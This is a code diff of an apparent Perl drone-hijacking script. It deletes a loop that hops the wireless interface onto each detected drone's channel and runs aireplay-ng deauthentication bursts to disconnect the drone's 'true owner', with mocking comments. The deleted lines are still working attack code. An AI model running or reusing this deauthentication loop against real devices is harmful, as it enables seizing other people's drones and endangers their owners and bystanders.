@@ -102,39 +102,6 @@ foreach my $cli (keys %clients)
 {
     print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";
 }
-
-# Give us some time so we can ready the hijacking computer
-print "Press Enter to continue...\n";
-<STDIN>;
-
-while (1) {
-
-		foreach my $cli (keys %clients)
-		{
-			print "Found client ($cli) connected to $chans{$clients{$cli}}[1] ($clients{$cli}, channel $chans{$clients{$cli}}[0])\n";
-
-
-			# hop onto the channel of the ap
-			print "Jumping onto drone's channel $chans{$clients{$cli}}[0]\n\n";
-			#sudo($airmon, "start", $interface, $chans{$clients{$cli}}[0]);
-			sudo($iwconfig, $interface, "channel", $chans{$clients{$cli}}[0]);
-
-			sleep(1);
-
-			# now, disconnect the TRUE owner of the drone.
-			# sucker.
-			print "Disconnecting the true owner of the drone ;)\n\n";
-			sudo($aireplay, "-0", "32", "-a", $clients{$cli}, "-c", $cli, $interface);
-
-		}
-
-		# go into managed mode
-		#sudo($airmon, "stop", $interface);
-
-
-	sleep 2;
-}
-
 	
 sub sudo
 {
